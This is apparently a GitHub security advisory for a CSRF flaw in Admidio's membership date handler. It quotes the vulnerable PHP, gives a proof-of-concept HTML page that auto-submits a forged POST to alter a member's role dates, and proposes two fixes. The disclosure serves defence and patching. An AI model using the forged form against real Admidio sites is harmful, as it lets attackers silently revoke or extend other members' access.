# [M] Admidio is Missing CSRF Protection on Role Membership Date Changes

## Summary
Severity: Medium
Advisory: GHSA-h8gr-qwr6-m9gx
CVE: CVE-2026-32755
CWE: CWE-352
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-h8gr-qwr6-m9gx
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.7

## Details
## Summary

The `save_membership` action in `modules/profile/profile_function.php` saves changes to a member's role membership start and end dates but does not validate the CSRF token. The handler checks `stop_membership` and `remove_former_membership` against the CSRF token but omits `save_membership` from that check. Because membership UUIDs appear in the HTML source visible to authenticated users, an attacker can embed a crafted POST form on any external page and trick a role leader into submitting it, silently altering membership dates for any member of roles the victim leads.

## Details

### CSRF Check Is Absent for save_membership

File: `D:/bugcrowd/admidio/repo/modules/profile/profile_function.php`, lines 40-42

The CSRF guard covers only two of the three mutative modes:

```php
if (in_array($getMode, array('stop_membership', 'remove_former_membership'))) {
    // check the CSRF token of the form against the session token
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);
}
```

The `save_membership` mode is missing from this array. The handler then proceeds to read dates from `$_POST` and update the database without any token verification:

```php
} elseif ($getMode === 'save_membership') {
    $postMembershipStart = admFuncVariableIsValid($_POST, 'adm_membership_start_date', 'date', array('requireValue' => true));
    $postMembershipEnd   = admFuncVariableIsValid($_POST, 'adm_membership_end_date',   'date', array('requireValue' => true));

    $member = new Membership($gDb);
    $member->readDataByUuid($getMemberUuid);
    $role = new Role($gDb, (int)$member->getValue('mem_rol_id'));

    // check if user has the right to edit this membership
    if (!$role->allowedToAssignMembers($gCurrentUser)) {
        throw new Exception('SYS_NO_RIGHTS');
    }
    // ... validates dates ...
    $role->setMembership($user->getValue('usr_id'), $postMembershipStart, $postMembershipEnd, ...);
    echo 'success';
}
```

File: `D:/bugcrowd/admidio/repo/modules/profile/profile_function.php`, lines 131-169

### The Form Does Generate a CSRF Token (Not Validated)

File: `D:/bugcrowd/admidio/repo/modules/profile/roles_functions.php`, lines 218-241

The membership date form is created via `FormPresenter`, which automatically injects an `adm_csrf_token` hidden field into every form. However, the server-side `save_membership` handler never retrieves or validates this token. An attacker's forged form does not need to include the token at all, since the server does not check it.

### Who Can Be Exploited as the CSRF Victim

File: `D:/bugcrowd/admidio/repo/src/Roles/Entity/Role.php`, lines 98-121

The `allowedToAssignMembers()` check grants write access to:
- Any user who is `isAdministratorRoles()` (role administrators), or
- Any user who is a leader of the target role when the role has `rol_leader_rights` set to `ROLE_LEADER_MEMBERS_ASSIGN` or `ROLE_LEADER_MEMBERS_ASSIGN_EDIT`

Role leaders are not system administrators. They are regular members who have been designated as group leaders (e.g., a sports team captain or committee chair). This represents a low-privilege attack surface.

### UUIDs Are Discoverable from HTML Source

The save URL for the membership date form is embedded in the profile page HTML:

```
/adm_program/modules/profile/profile_function.php?mode=save_membership&user_uuid=<UUID>&member_uuid=<UUID>
```

Any authenticated member who can view a profile page can extract both UUIDs from the page source.

## PoC

The attacker hosts the following HTML page and tricks a role leader into visiting it while logged in to Admidio:

```html
<!DOCTYPE html>
<html>
<body onload="document.getElementById('csrf_form').submit()">
  <form id="csrf_form"
        method="POST"
        action="https://TARGET/adm_program/modules/profile/profile_function.php?mode=save_membership&user_uuid=<VICTIM_USER_UUID>&member_uuid=<MEMBERSHIP_UUID>">
    <input type="hidden" name="adm_membership_start_date" value="2000-01-01">
    <input type="hidden" name="adm_membership_end_date"   value="2000-01-02">
  </form>
</body>
</html>
```

Expected result: The target member's role membership dates are overwritten to 2000-01-01 through 2000-01-02, effectively terminating their active membership immediately (end date is in the past).

Note: No `adm_csrf_token` field is required because the server does not validate it for `save_membership`.

## Impact

- **Unauthorized membership date manipulation:** A role leader's session can be silently exploited to change start and end dates for any member of roles they lead. Setting the end date to a past date immediately terminates the member's active participation.
- **Effective access revocation:** Membership in roles controls access to role-restricted features (events visible only to role members, document folders with upload rights, and mailing list memberships). Revoking membership via CSRF removes these access rights.
- **Covert escalation:** An attacker could also extend a restricted membership period beyond its authorized end date, maintaining access for a user who should have been deactivated.
- **No administrative approval required:** The impact occurs silently on the victim's session with no confirmation dialog or notification email.

## Recommended Fix

### Fix 1: Add `save_membership` to the existing CSRF validation check

```php
// File: modules/profile/profile_function.php, lines 40-42
if (in_array($getMode, array('stop_membership', 'remove_former_membership', 'save_membership'))) {
    // check the CSRF token of the form against the session token
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);
}
```

### Fix 2: Use the form-object validation pattern (consistent with other write endpoints)

```php
} elseif ($getMode === 'save_membership') {
    // Validate CSRF via form object (consistent pattern used by DocumentsService, etc.)
    $membershipForm = $gCurrentSession->getFormObject($_POST['adm_csrf_token']);
    $formValues = $membershipForm->validate($_POST);

    $postMembershipStart = $formValues['adm_membership_start_date'];
    $postMembershipEnd   = $formValues['adm_membership_end_date'];
    // ... rest of save logic unchanged
}
```

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-h8gr-qwr6-m9gx
- https://nvd.nist.gov/vuln/detail/CVE-2026-32755
- https://github.com/Admidio/admidio
- https://github.com/Admidio/admidio/releases/tag/v5.0.7
